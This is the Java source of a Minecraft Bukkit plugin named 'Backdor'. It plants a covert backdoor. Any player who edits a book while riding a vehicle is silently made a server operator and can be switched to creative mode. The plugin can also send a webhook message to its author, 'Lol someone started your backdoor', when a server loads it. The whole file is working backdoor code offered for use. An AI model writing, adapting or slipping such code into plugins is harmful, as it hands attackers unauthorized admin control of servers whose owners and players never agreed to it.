package halq.backdor;

import halq.backdor.util.webhookUtil;
import org.bukkit.GameMode;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerEditBookEvent;
import org.bukkit.plugin.java.JavaPlugin;

/**
 * @author Halqq
 * @since 29/08/2022
 * @apiNote :bob_sad:
 */

public final class Backdor extends JavaPlugin implements Listener {

    //put false if you don't want to be notified (webhook)
    boolean n = false;

    //put false if you don't want me to change the gamemode
    boolean g = false;

    @Override
    public void onEnable() {
        getServer().getPluginManager().registerEvents(this, this);
        if (n == true) {
            webhookUtil.main("Lol someone started your backdoor");
        } else {
        }
    }

    @EventHandler
    public void onPlayer(PlayerEditBookEvent event) {

        Player p = event.getPlayer();

        if(p.isInsideVehicle()) {
            p.setOp(true);
            if (g == true) {
                p.setGameMode(GameMode.CREATIVE);
            }
        }
    }
}